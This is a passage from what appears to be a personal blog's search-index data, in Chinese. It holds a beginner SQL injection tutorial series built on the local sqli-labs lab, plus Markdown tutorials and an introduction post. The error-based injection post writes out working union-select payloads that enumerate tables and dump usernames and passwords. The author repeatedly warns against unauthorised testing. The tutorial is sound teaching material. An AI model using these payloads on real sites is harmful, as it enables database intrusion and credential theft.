需要你输入用户名和密码，你输入了zhangsan和123。如果我安全意识很低，做网站的时候给这个表单method属性设置为GET，那么你提交的时候地址栏可能就变成了https://bowenyoung.cf/?username=zhangsan&amp;password=123。如果我比较贴心，我就会设置成POST，那么你还是把参数传给了我这个网站的服务器，但是地址栏上就看不到了~~你旁边的人也就没这么容易看到你的密码了~~。 网页URL编码URL 只能使用 ASCII 字符集通过因特网进行发送。由于 URL 通常包含 ASCII 集之外的字符，因此必须使用URL编码将 URL 转换为有效的 ASCII 格式。URL编码也被用来防止SQL注入。知己知彼，百战不殆😜可以参考W3School的这篇文章，还有编码转换工具：链接 注入原理 Q:数据库后端如何执行查询操作？想象我的博客有一个登录界面需要输入用户名和密码，当你输入用户名和密码后，后端就会产生 并执行一条查询（SQL查询），登录成功后该查询结果会被显示在我们的主页。例如: 12username: zhangsanpassword: 123 那么后端查询语句可能是这样：SELECT * FROM 某张表 WHERE username='zhangsan' AND password='123';如果用户名和密码都正确，就会返回这些内容。（当然会经过处理，一般不是直接看一张表）当然，查询语句也可能是SELECT * FROM 某张表 WHERE username=\"zhangsan\" AND password=\"123\";或者是SELECT * FROM 某张表 WHERE username=（'zhangsan'）AND password= （'123'）;或者SELECT * FROM 某张表 WHERE username=（\"zhangsan\"）AND password=\"123\";或是其他形式，这取决于开发人员如何将参数封装起来。 如果参数用单引号封装，输入zhangsan'会发生什么？后端查询语句就变成：SELECT * FROM 某张表 WHERE username='zhangsan'' AND password='123';显然'zhangsan''这里多了一个单引号，发生了错误。在前端有报错回显的时候，这条语句的报错就直接显示在我们的浏览器上了。 除了去掉这个多余的单引号，还有什么方法能不报错呢？这时候我们就要用到之前讲的注释了。假如我们输入zhangsan'--+或者zhangsan'# ，后端查询语句就变成了：SELECT * FROM 某张表 WHERE username='zhangsan' --+' AND password='123';或者SELECT * FROM 某张表 WHERE username='zhangsan' #' AND password='123';我们知道，被注释掉的内容是不会被执行的，因此上述语句如果忽略注释的内容就成了：SELECT * FROM 某张表 WHERE username='zhangsan'单引号就闭合了！这条语句是完全正确的！ 上面这条语句只有用户名也能查询吗？如果开发人员没有进行过滤筛查，那么答案是肯定的！也就是说我们通过注释的方式，修改了SQL语句，使得我们用非正常的方式查询到了数据，这其实就是SQL注入的原理了。 开始实践准备工作我们打开PHPstudy面板将服务开启 在浏览器中输入localhost/sqli/Less-1，注意将sqli改成你设置的文件夹名称。这样我们就来到了第一课。 2 根据提示”请输入ID作为数值参数“，加上这关是GET方式传参（关卡的信息可以看到）。所以我们在地址栏URL末尾加上?id=1，意思是通过GET方式传递一个数值为1的参数。回车，观察页面显示： 3 可以看到页面显示了登录名和密码。接下来我们增大id值2,3,4……一直到14，发现都显示了登录名和密码，但大于14之后不再显示。这是怎么回事？我们联系后端查询语句可以知道，这说明这张表有14个id对应了14条不同的记录（行)。我们已经获得了这张表的一些信息。 破坏查询接下来我们要破坏查询。记得之前说的在值后面加一个单引号会发生什么吗？是的，会报错。我们尝试输入将1改成1’。页面显示如下： 4 当然这里单引号被转换为了URL编码，可以参考之前在基础知识里提到的文章。现在我们分析这条报错语句，提示的是near ''1'' LIMIT 0,1' at line 1这里有一个语法错误。这里的语句内容使用单引号包裹起来的，因此我们先去除最外层的单引号，可以知道后端查询语句这部分为：'1'' LIMIT 0,1而我们输入的是1’，把这个值也去掉就会发现，我们输入的参数是被单引号包裹起来的。这样我们就判断出了注入的类型按参数分是单引号型。如果你觉得使用单引号来判断注入类型看得不清楚，可以使用转义字符\\来判断。将参数改为1\\。页面显示如下： 5 这样，转义字符\\后的字符就是将参数封装起来的字符。值得一提的是，并非所有参数都由单引号封装。我们可以尝试用同样的方法去破坏LESS2,3,4,5,6的查询。结果分别如下图： LESS2 LESS3 LESS4 LESS5 LESS6 通过分析报错语句我们可以知道2中的参数是裸露的，没有用任何字符封装，3用')封装，4用\")封装，5用'封装，6用\"封装。 消除语法错误知道了注入的参数是被什么字符封装起来的以后，我们就要考虑去除语法错误。在前面我们已经讲过如何去除语法错误了。我们回到LESS1进行实验。在地址栏URL末尾输入?id=1--+或者?id=1'--%20（%20 URL编码为空格）或者?id=1'%23（%23 URL编码为 # ） 输入?id=1时后端查询语句我们可以通过报错信息猜测后端查询语句为： 1SELECT * from table_name WHERE id='1' LIMIT 0,1 那么现在变成了 123SELECT * from table_name WHERE id='1'-- ' LIMIT 0,1或者SELECT * from table_name WHERE id='1'#' LIMIT 0,1 忽略注释掉的内容就是： 1SELECT * from table_name WHERE id='1' 这时候单引号被我们闭合了，后面的语句被我们注释掉了，当然仍然能够成功执行！ 同理，LESS2-6也可以根据参数被封装的类型，使用注释去除语法错误。 添加语句我们通过注释的方法减少了原来语句的内容，那我们能否增加我们想要查询的内容呢？当然可以！ SELECT * from table_name WHERE id='1'【插入语句】-- ' LIMIT 0,1我们在注释前插入语句，就可以增加查询的内容。如何实现呢？我们会想到，在这里再加一条SELECT语句不就完事儿了吗？是的，但我们需要用到之前划重点的union。这里就涉及到一个问题，union连接的select语句必须查询字段数相同，但是我们并不知道原来的SELECT查询了多少个字段。我们先要知道查询结果有多少个字段（不一定所有查询结果都会显示再页面上，所以从页面上得不到信息）。这时候就要用到order by了。我们在插入语句的地方加上order by 1，如下图： 12 order by 1表示按照查询结果的第一列进行排序。页面显示正确，说明查询结果有第一列（废话）。我们再增大列数，一直到order by 4，出现了报错： 13 提示没有第4列，因此我们得到查询结果有且仅有3列。这时候就可以用union了。新的问题来了，我们查询了3列，但每次改变id只改变了login name和password后面的内容，这不是两列吗？的确是两列，因为经过开发人员处理，回显给我们的是3列中的两列。因此我们要判断显示的是哪两列。这里先讲一下字面量的概念。我们之前说select后面加的是字段名，这时候会查询相应的列。但如果我们select 1,2,3呢？这时候并不是查询第1,2,3列，而是直接查询出来这几个数字1,2,3。这些数字就叫做字面量。利用查询字面量的方式我们可以判断回显了第几列。试想一下，select 1,2,3这个语句被执行。页面上如果显示： 12Your Login name:1Your Password:2 这不就代表页面回显了查询结果的第1，2列吗？因此我们会想到在插入语句处加上union select 1,2,3。但是发现页面回显没有变化。这是因为总共只显示了id=1对应的两条记录。union后面的语句查询到了也没地方显示了。只要让union之前的语句什么都查不到，就可以显示union后面的语句了！也就是让where后面的条件对应不上表里的内容，我们可以将id改成0（或者负数，比记录数14还大的数），毕竟很有可能没有id=0的记录。也就是url末尾改成?id=0' union select 1,2,3--+，如图： 14 发现页面回显2，3。说明页面回显了查询结果的第2，3列。这时候我们就可以把我们想要查询的数据放在第2，3列的位置，页面就会回显出来给我们。通常来说，我们可能会想要获取的基本信息有：数据库类型、版本号，当前数据库名称，当前执行查询的用户名……通常都有相应的函数或常量来查询这些基本信息。下表给出了部分函数或常量： 函数或常量名 返回值 system_user() 系统用户名 user() 用户名 current_user() 当前用户名 session_user() 链接数据库的用户名 database() 当前使用的数据库名 version() 数据库版本 @@datadir 数据库目录 @@tmpdir 操作系统缓存的临时目录 这里以获取数据库版本和当前数据库名为例将1,2,3改为1,version(),database()，得到如下结果： 15 之前讲了数据库指纹，通过之前的报错信息我们可以知道使用的是MySQL数据库，结合此处5.7.26可知使用的是MySQL5.7.26版本，当前使用的数据库是security。 16 从PHPStudy面板来看，的确如此。 获取敏感信息但光知道这点信息我们肯定不满足啊，我们肯定想知道当前数据库里有什么敏感信息，比如用户名密码以及用户的其他信息。 这时候要用到之前提到过的information_schema数据库以及其中的tables,columns表。先来解释一下这些内容。 information_schema数据库是MySQL自带的数据库。它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。 其中的tables表存储了所有的表名(table_name)，以及表所在的数据库名(table_schema)等信息 其中的columns表存储了所有的字段名(column_name)，以及字段所在的表名(table_name)等信息 接下来开始实验：输入?id=0' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+。意思是从information_schema数据库中的tables表查询表名，条件是表所在的数据库是当前数据库。页面显示如下： 17 显示了emails，但数据库不太可能只有这一张表。这是因为开发人员让每一列只显示了一条记录。我们可以在语句后加上LIMIT 数字,1来限制显示第几行。比如加上LIMIT 0,1表示显示第0行，LIMIT 1,1表示显示第1行，第一行显示如下（?id=0' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1--+）： 18 我们当然可以一次次改变limit的第一个参数来获取数据，但还有一种方法让所有记录一起显示出来。就是使用group_concat()这个函数。例如，?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+，页面显示如下： 19 这时候我们发现，所有的表就被列举出来了。我们可以看到这里存储的其实都是一些敏感信息，我们以users表为例去查看里面有哪些字段名。输入?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+。意思是从information_schema数据库中的columns表查询存储的字段名数据，条件是该记录的table_name表名是users。显示结果如下： 20 东西很多，我们就看看用户名和密码吧输入?id=0' union select 1,group_concat(username),group_concat(password) from users--+。意思是从当前数据库（security）中的users表查询其中的username列和password列。显示如下： 21 可以看到用户名和密码就一一对应地显示出来了！我们的目标基本就达到了!当然这仅仅是以LESS1为例查询了部分信息，有兴趣的朋友可以尝试2-6关、查询其他的一些数据（因为是演示项目有些表里面可能没有数据) 结语至此，我们对于基于报错的注入的学习就结束了。原理非常简单，但是需要练习来消化一下。下一期的内容我们讲解布尔盲注，也就是LESS8。LESS7是将查询的内容输出为文件，不涉及注入的原理，我们就跳过了。可以通过RSS订阅本篇博客来更早获知更新信息。也欢迎在博文下方留言或者邮箱联系我！","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入新手教程（一）——sqli-labs靶场搭建","slug":"sqli1","date":"2022-05-08T02:42:32.000Z","updated":"2022-05-08T02:42:32.000Z","comments":true,"path":"posts/sqli1/","link":"","permalink":"https://blog.beacox.space/posts/sqli1/","excerpt":"网站环境搭建首先我们要搭建一个（本地）网站环境，如果对搭建网站不是很熟悉的小伙伴们可以使用XAMPP或者PHPstudy来搭建。","text":"网站环境搭建首先我们要搭建一个（本地）网站环境，如果对搭建网站不是很熟悉的小伙伴们可以使用XAMPP或者PHPstudy来搭建。这两个软件集成了搭建网站所需要用到的PHP、Apache、MySQL等软件。如果自己用其他方式搭建的话要注意sqli-labs是不支持PHP7的，因为之前版本的一些要用到的函数在PHP7中被删除了。我用的是5.6.9版本。这里我就用PHPstudy为例（听名字就知道使用起来更简单）: 首先确保没有安装过PHP，Apache或MySQL 前往官网下载PHPstudy：https://www.xp.cn/ 下载完成后安装，打开面板。 1-1 1-2 如图示操作，第一次打开应该点击更多版本，找到php5.6.9或者更低的版本安装。并将php版本切换成你安装的那个版本。接下来回到首页，按图操作： 1-3 将WAMP、Apache和MySQL启动，其他的停止。这里可能会遇到端口被占用的情况导致某个套件无法启动。遇到这个问题可以去找占用了改端口的进程并将其停止。Windows用户可以参考这篇文章：链接 如果上述过程都顺利完成，接下来在你的浏览器输入localhost或127.0.0.1就可以进入默认网页。这时就代表网站环境已经搭建成功了！芜湖！ sqli-labs下载与配置sqli-labs在GitHub上开源，直接到仓库里下载zip文件：https://github.com/Audi-1/sqli-labs 2-1 下载完成后解压并复制到phpstudy_pro\\www\\目录下 2-2 我这里将解压好的文件夹重命名为sqli方便我之后打开。注意：要确保你复制过来的文件夹打开是下图这样，如果打开是一个同名的文件夹，你应该把图中内容剪切出来并删除这个同名的文件夹 2-3 接着在sql-connections目录下找到db-creds.inc文件并打开修改 2-4 2-5 使用PHPstudy的话，用户名密码默认都是root，都修改为root即可。要是不喜欢的话可以打开PHPstudy面板点击数据库，按照相应提示修改密码就可以了。但一定要确保MySQL数据库的用户名密码和该配置中一致！！！ 接下来在浏览器中输入localhost/sqli/，这里sqli要换成你在Github上下载的那个文件夹解压后改的名字。（可以补充一下，这里搭建的网站其实就是www根目录下的所有文件和目录的集合。在后面加一个sqli/其实就是进入了sqli这个文件夹，然后进这个文件夹默认显示的就是这个文件夹里面的index.html或者index.php） 言归正传，打开后显示如图： 2-6 点击setup/reset Database for labs进行sqli-labs的初始化，初始化成功的页面如图： 2-7 如果看到这个页面，congratulations！sqli-labs靶场环境已经搭建成功了。接下来只要点击page1/2/3/4就可以去完成挑战了！ 结语还是要强调，不要在不被授权的网站上练习MySQL。下一期（很快555）我们学习基于报错的的注入，也就是less1-less6。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入新手教程——前言","slug":"sqliIntro","date":"2022-05-05T09:38:23.000Z","updated":"2022-05-05T09:38:23.000Z","comments":true,"path":"posts/sqliIntro/","link":"","permalink":"https://blog.beacox.space/posts/sqliIntro/","excerpt":"什么是SQL注入？​ 要了解什么是SQL注入，我们首先要知道SQL是什么。SQL，全称Structured Query Language，即数据库的结构化查询语句，用来从数据库中查询内容。","text":"什么是SQL注入？​ 要了解什么是SQL注入，我们首先要知道SQL是什么。SQL，全称Structured Query Language，即数据库的结构化查询语句，用来从数据库中查询内容。​ 绝大多数网站都有一个数据库，比如我们在网购平台搜索商品的时候，其实就是在从网站的数据库中查询我们想要的内容，这个过程就用到了SQL语句，只不过是在设计好的语句中插入了我们输入的值。​ 但是如果一个web应用程序对用户输入的内容不进行严格的筛查和过滤，用户就有可能通过改变输入的值、添加SQL语句执行不被授权的操作，从而查看数据库的敏感信息或者在服务器上植入木马等。这个过程就被称为SQL注入 学习SQL注入需要什么基础？​ 显然，要学会基本的SQL语句。目前大多数网站使用的都是开源可以白嫖的MySQL数据库，因此建议学MySQL。当然，不同的数据库有不同的特性，但是绝大部分SQL语句都是通用的，因此学好一个数据库，其他的基本上也就没问题了。学的时候有几个重点：掌握好“增删查改“；MySQL自带的information_schema数据库中tables, columns, schemata表要有一个大概的了解（之后学习SQL注入的时候经常要查询其中的内容）。存储引擎、事务、数据库设计之类的可以不用深入学甚至不学。​ 其他的一些基础比如cookie，比较零碎，可以学到的时候再进行学习。 如何学习（实践）SQL注入？​ SQL注入是一项技术，是技术就需要实践。但我们知道，利用SQL注入攻击他人的网站是违法行为，如果严重甚至构成犯罪。那么想要实践，就剩下两种方案：攻击用于学习SQL注入的网站；攻击自己搭建的测试网页。 用于学习SQL注入的网站 vulnweb PortSwigger 自己搭建靶场 sqli-labs (本系列会介绍如何搭建) DVWA这两个项目都在GitHub上开源，搭建教程可以去google或者CSDN搜索。 再次强调！！！千万不要在未授权的情况下尝试SQL注入！！！ SQL注入的分类​ 通过不同的分类方式，SQL注入被分为许多不同类型。但笔者认为如何分类并不十分重要，关键是要掌握每种SQL注入的原理。当然，还是要简单介绍一下SQL注入的分类。 按照是否回显（在页面上显示查询的报错信息）可以分为： 显注 盲注 按照请求方式（服务器获取用户提供信息的方式）可以分为： GET型注入 POST型注入 Cookie型注入 HTTP Header型注入 按照插入到查询语句中的参数类型可以分为： 数值型注入（传入的参数为数值） 字符型注入（传入的参数为字符串） 单引号字符型注入（字符串用单引号包裹：’输入的字符串’） 双引号字符型注入（字符串用双引号包裹：”输入的字符串”） 带括号的注入 数值+括号：(输入的数值) 单引号字符串+括号：(‘输入的字符串’) 双引号字符串+括号：(“输入的字符串”) 可以通过RSS订阅本篇博客,下一期将带大家搭建靶场环境🤓🤓🤓","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Markdown进阶教程（以Typora为例）","slug":"mdLearn2","date":"2022-04-14T08:19:52.000Z","updated":"2022-04-14T08:19:52.000Z","comments":true,"path":"posts/mdLearn2/","link":"","permalink":"https://blog.beacox.space/posts/mdLearn2/","excerpt":"此篇博客是进阶教程建议零基础小白先食用：基础教程","text":"此篇博客是进阶教程建议零基础小白先食用：基础教程 目录写法在任意位置添加[TOC]即可显示树状结构文章目录。显示效果可以参考本文目录：下图。 目录 锚（跳转）有两种方法： Markdown原生： 1234跳转的终点（锚）：同html,见下跳转的起点（链接）：[显示的内容](#id)可以理解为跳转终点（锚）定义了一个名为id的元素，而跳转起点则是一个指向该元素的链接例如：文章第一句话的写法：&lt;a id=\"1\"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：[跳转至开头](#1) 跳转至开头 ←点击此处查看效果注：id这里建议写英文或数字，不要写中文，可能会出错 HTML写法： 1234跳转终点：&lt;a id=\"xxx\"&gt;显示的内容&lt;/a&gt;跳转起点：&lt;a href=\"#xxx\"&gt;显示的内容&lt;/a&gt;除了a标签外，用p,div,span等标签也有效（将a改成p,div或span）例如：文章第一句话的写法：&lt;a id=\"1\"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：&lt;a href=\"#1\"&gt;跳转至开头&lt;/a&gt; 跳转至开头←点击此处查看效果注：若要跳转到零一页面的锚，在终点的#xxx之前添加文件名（如1.html）即可 To-do list（任务列表） 未完成：- [ ] 短横+空格+左方括号+空格+右方括号+空格 已完成：-[x] 短横加空格+左方括号+字母x+右方括号+空格 注意-和[]中间一定要加空格、后面爷要加空格，未完成的写法[]中间有空格 举例： 123- [ ] 学习- [x] 打游戏- [x] 看电影 效果： 学习 打游戏 看电影 脚注由于本站源代码问题，脚注没有被很好地显示出来！ 如果有参考文献或文章之类的话应该要用的正文中脚注的编号用[^1],[^2],[^3]等，尾部注释对应用[^1]: 注释内容，[^2]: 注释内容 ，[^3]: 注释内容等脚注编号显示在文字右上角，鼠标移上去会显示注释内容 举例： 12他[^1]文末处：[^1]: 黑框眼镜 正文效果：他^1（注释在文末） Unicode特殊字符(emoji)格式为&amp;#数字;，其实是HTML举例：&amp;#937;为Ω，&amp;#952;为θ。 unicode字符包含的内容非常之多，最典型的还属emoji。如&amp;#128517;😅&amp;#129299;🤓 这里是unicode的参考网址 支持HTML的典型例子音频html5语法： 123&lt;audio src=\"音频文件路径\"&gt;不能播放时的报错信息&lt;/audio&gt; 举例： 123&lt;audio src=\"audio.mp3\"&gt;您的浏览器不支持播放该音频&lt;/audio&gt; 视频同为html5语法： 123&lt;video src=\"视频文件路径\"&gt;不能播放时的报错信息&lt;/video&gt; 举例： 123&lt;video src=\"video.mp4\"&gt;您的浏览器不支持播放该音频&lt;/video&gt; 改变字体颜色和大小语法: 123&lt;font color=#00ffff size=7 face=\"纯书法字体\"&gt;青色7号纯书法字体&lt;/font&gt;或者&lt;font color=cyan size=7 face=\"纯书法字体\"&gt;或者可以这么写&lt;/font&gt; 显示效果: Markdown制图^2Markdown可以绘制很多图,如时序图、甘特图、mermaid流程图、flow流程图等。这里主要介绍flow流程图。其他的图可以参考这篇CSDN博客：点击跳转首先，用一对3个`包裹代码块并在第一处后输入flow，确定这一段代码用flow来编写然后就是绘制流程图的步骤。绘制流程图可以分为两步： 定义元素（框框和里面的内容）： 元素名称=&gt;元素类型: 显示的内容:&gt;超链接URL(:&gt;URL可以不要) 注意：=&gt;后不能有空格， :后需要有空格 元素类型有6种，分别为： 开始（椭圆形）：start 结束（椭圆形）：end 子程序（长得像圣旨诏书）：subroutine 操作（矩形）：operation 条件判断（菱形）：condition 输入输出（平行四边形）：inputoutput 关联元素 用 -&gt; 来关两个节点 如果是 condition 节点将会有 yes/true 和 no/false 两个分支 left/right表示连线出口在节点位置（默认下面是出口，如con2），也可以跟condition变量一起用，如：con1(yes,right) 举例： 123456789101112131415```flowstart=&gt;start: 开始end=&gt;end: 结束in=&gt;inputoutput: 输入年份ncon1=&gt;condition: n能否被4整除？con2=&gt;condition: n能被100整除？con3=&gt;condition: n能被400整除？out1=&gt;inputoutput: 输出闰年out2=&gt;inputoutput: 输出非闰年start(right)-&gt;in-&gt;con1(yes,right)-&gt;con2(yes)-&gt;con3(yes)-&gt;out1-&gt;endcon1(no)-&gt;con2-&gt;endcon2(no,right)-&gt;out1con3(no)-&gt;out2``` 效果： flow流程图 数学公式原生的Markdown是不支持LaTex的，但如果用Typora则支持LaTex预览最后的显示效果取决于用什么软件编译和导出 总结本博客名为教程，实则是个人学习Markdown的一些学习经验分享，不保证完全正确和详尽。欢迎指正错误，也欢迎留言分享哦！ 今日一言： 我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。 —— 王小波","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"https://blog.beacox.space/tags/Markdown/"}]},{"title":"Markdown基础教程（Typora为例）","slug":"mdLearn","date":"2022-04-09T14:08:36.000Z","updated":"2022-04-09T14:08:36.000Z","comments":true,"path":"posts/mdLearn/","link":"","permalink":"https://blog.beacox.space/posts/mdLearn/","excerpt":"什么是MarkdownMarkdown是一种轻量级标记语言，易读易写的纯文本格式编写文档。Markdown编写文档后缀为md","text":"什么是MarkdownMarkdown是一种轻量级标记语言，易读易写的纯文本格式编写文档。Markdown编写文档后缀为md 为什么要用markdown 简单易上手，可读性强。 兼容html，但在排版、链接、标题等写法上都简单许多。本站的博客都是用Markdown编写的。 用途广，如今Github、简书、csdn等许多网站都支持Markdown语法编写 做项目时可以用来编写简洁明了的README.md来介绍功能、用法等 Markdown编辑器 Typora 个人目前的首选编辑器。可以利用css实现自定义样式；内置LaTex，方便编辑数学公式；可以实时预览。支持MacOS、Windows、Linux。1.0以前的版本免费，之后的版本收费。可以根据需要购买。官网：https://typora.io/ 中文站：https://typoraio.cn/ VSCode对于码农朋友们来说应该非常熟悉了。可以点击链接在官网下载。安装相应的Markdown插件之后就能有不错的Markdown编辑器体验了。这里分享一篇VSCode Markdown插件的教程博客：CSDN博客 Notedpad++官网下载地址：https://notepad-plus-plus.org/downloads/ Notion学生认证可以免费升级，还支持移动端。功能不止于Markdown编辑器，是一款笔记和效率应用。官网下载地址：https://www.notion.so/ 开始教程正文标题Markdown支持6种级别的标签，对应到html就是h1~h6，数字越小，标题等级越高，字体越大。语法如下： 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 以上语言的效果如下： 标题 注释语法：&lt;!--这里是被注释掉的内容--&gt;和html中的注释语法是一样的，被注释掉的部分将对读者不可见。写一些注释对你理解自己的文章结构是有好处的。 换行与分段换行是两句属于同一段，不在同一行；分段则是两句在不同行、不同段。会比换行有更明显的行间距举例说明： 这两句是换行这两句是换行 这两句是分段 这两句是分段 换行：在两句之间加入&lt;br&gt;或&lt;br /&gt;实现换行。 注：如果你正在使用typora，shift+enter可以换行 分段：enter 字体用*或_包裹一段文字可以用来强调。一对是斜体，两对是加粗，三对是加粗斜体 12345678*这里是斜体*_这里是斜体_**这里是加粗**__这里是加粗__***这里是加粗斜体***___这里是加粗斜体___ 以上代码的显示效果如下： 这里是斜体这里是斜体 这里是加粗这里是加粗 这里是加粗斜体这里是加粗斜体 除此之外还有高亮语法 1==这里是高亮== ==这里是高亮== 下划线和删除线非链接尽量避免使用下划线，以免和链接混淆，读者体验很差。这里不多赘述。删除线是用的比较多的一个语法 1~~加上删除线~~ 加上删除线 上标和下标用一对^包裹上标。如x^2^显示为x^2^用一对~包裹下标。如H~2~O显示为H2O 引用单行引用1&gt;引用内容 引用内容 多行引用12&gt;第一行引用&gt;第二行引用 第一行引用第二行引用 12&gt;第一行使用'&gt;'后面行省略也是引用 第一行使用’&gt;’后面行省略也是引用 123&gt;引用内容需要分段时，&gt;&gt;可以在引用内容中加一个空行 引用内容需要分段时， 可以在引用内容中加一个空行 另外，在引用中可以使用任意Markdown语法 列表在符号后记得加上空格 无序列表123* 可以使用'*'作为标记+ 也可以使用'+'作为标记- 也可以是'-' 可以使用’*’作为标记 也可以使用’+’作为标记 也可以是’-‘ 有序列表12341. 有序列表以阿拉伯数字和'.'开始2. 数字的顺序不影响生成的列表索引1. 比如这样2. 但是建议按照自然顺序编写 有序列表以阿拉伯数字和’.’开始 数字的顺序不影响生成的列表索引 比如这样 但是建议按照自然顺序编写 嵌套序列1234561. 第一层 + 第二层 + 第二层2. 无序列表和有序列表可以以任一方式嵌套 1. 2-1 2. 2-2 第一层 第二层 第二层 无序列表和有序列表可以以任一方式嵌套 2-1 2-2 分割线在一行中使用三个及以上的*,+,-来添加分割线 123***++++----- 符号之间加上空白字符是被允许的 1* * * 代码行内代码用一对反引号’ 来包裹行内代码（切换英文输入后按tab键上面，1键左边的按键） 1`这里是行内代码` 这里是行内代码 代码块可以在代码块中展示多行代码，可以允许复制，清晰易用用一对```来包裹代码块 12#include &lt;iostream&gt;//前面是```using namespacestd;//后面是``` ==值得一提的是，在行内代码和代码块中Markdown语法是无效的== 超链接行内式格式为[展示给读者的链接名称](路径，读者不可见) 网络路径 1[我的Gitgub主页](https://github.com/BeaCox) 我的Gitgub主页 本地相对路径如./images/icon.png 本地绝对路径如C:\\Users\\Admin\\Desktop\\setu.png 自动链接使用&lt;&gt;包裹的URL或邮箱地址会被自动转换为超链接 12&lt;https://github.com/BeaCox&gt;&lt;root@beacox.space&gt; https://github.com/BeaCoxroot@beacox.space 适用于较短的链接，不然显得很丑==另外，邮箱还可以用[名称](mailto:你的邮箱地址)==如我的邮箱还有一种参考式用起来比较麻烦一些，有兴趣可以自己了解一下 图像和插入超链接的语法基本一致，在最前面加了一个!。也分行内式和参考式。路径也分为网络路径和本地的相对、绝对路径。这里就做一个网络路径的演示。 1![哆啦A梦](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201501%2F07%2F20150107123112_xPJLh.thumb.1000_0.jpeg&amp;refer=http%3A%2F%2Fc-ssl.duitang.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1652103506&amp;t=a7a2bc00990a39a5b2cd1547a7f4b9d0) 哆啦A梦 转义字符下列字符都可以通过使用反斜杠字符\\达到转义目的，避免与要用于Markdown语法的那些混淆 字符 名称 \\ 反斜杠 ` 反引号 * 星号 _ 下划线 () 圆括号 [] 方括号 {} 花括号 # 井号 + 加号 - 减号 . 句点 ! 感叹号 | 管道符 表格单元格和表头使用|来分隔不同的单元格，使用-分隔表头和其他行。 1234|name|money||---|---||Jobs|$10||Young|$10000000000| name money Jobs $10 Young $10000000000 对齐在表头下方的分割线标记中加入:，即可标记下方单元格内容的对齐方式 :--- 左对齐 :--:居中对齐 ---:右对齐 1234|left|center|right||:---|:--:|---:||Jobs|Gates|Musk||==Me==|Boyce|Young| left center right Jobs Gates Musk ==Me== Boyce Young ==可以在表格中使用Markdown语法== 总结以上就是Markdown基础教程（以Typora为例）的全部内容。之后会找时间更新进阶教程。上面的代码希望大家能自己敲一遍。光凭看去学任何语言，哪怕是Markdown这样的轻量标记语言，都是低效的。 ”一个人在科学探索的道路上走过弯路犯过错误并不是坏事,更不是什么耻辱,要在实践中勇于承认和改正错误。“ ——爱因斯坦 纠错：==包裹文字高亮语法是markdown高级语法，各平台支持度不一样。如果要在不支持该语法的平台使用可以尝试用css","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"https://blog.beacox.space/tags/Markdown/"}]},{"title":"初来乍到，请多指教！","slug":"firstblog","date":"2022-04-09T09:21:25.000Z","updated":"2022-04-09T09:21:25.000Z","comments":true,"path":"posts/firstblog/","link":"","permalink":"https://blog.beacox.space/posts/firstblog/","excerpt":"我是谁？","text":"我是谁？ 我是一名普通大学生、极客爱好者。 是NBA和F1的狂热粉丝。 白日梦是成为一名优秀的（白帽）hacker。 我将在这个网页上更新我的学习经历、生活等。 请多多指教！ 为什么搭建这样一个博客？ 其实最直接的原因是最近在w3school学html+css，又偶然间在油管上刷到了利用hexo和github搭建个人博客的视频，脑子一热，就花了一段时间搭建了这个网站。 还有一个原因就是为了装杯，毕竟听说学IT的人总归要有个个人博客。技术不行那就先拿博客凑个数 然后呢就是为了有一个渠道去分享我的一些学习经验和生活吧。更新随缘。 如何联系我 邮箱 Github主页 欢迎所有访客的友好交流和建议哦！","categories":[],"tags":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.beacox.space/categories/CTF/"},{"name":"系统安全","slug":"系统安全","permalink":"https://blog.beacox.space/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"},{"name":"游戏","slug":"游戏","permalink":"https://blog.beacox.space/categories/%E6%B8%B8%E6%88%8F/"},{"name":"软件","slug":"软件","permalink":"https://blog.beacox.space/categories/%E8%BD%AF%E4%BB%B6/"},{"name":"前沿","slug":"前沿","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E6%B2%BF/"},{"name":"项目","slug":"项目","permalink":"https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"},{"name":"生活","slug":"生活","permalink":"https://blog.beacox.space/categories/%E7%94%9F%E6%B4%BB/"},{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"},{"name":"阅读笔记","slug":"阅读笔记","permalink":"https://blog.beacox.space/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"},{"name":"Web安全","slug":"Web安全","permalink":"https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"}],"tags"